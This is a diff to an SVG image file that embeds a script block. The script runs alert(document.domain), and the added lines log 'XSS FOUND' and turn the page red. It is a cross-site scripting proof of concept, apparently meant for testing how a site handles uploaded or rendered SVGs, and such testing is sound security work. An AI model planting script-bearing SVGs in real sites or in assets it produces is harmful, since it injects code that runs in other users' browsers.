@@ -1,6 +1,8 @@
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
     <script>//<![CDATA[
         alert(document.domain)
+        console.log("XSS FOUND")
+        document.body.style.backgroundColor='red'
     //]]>
     </script>
 </svg>
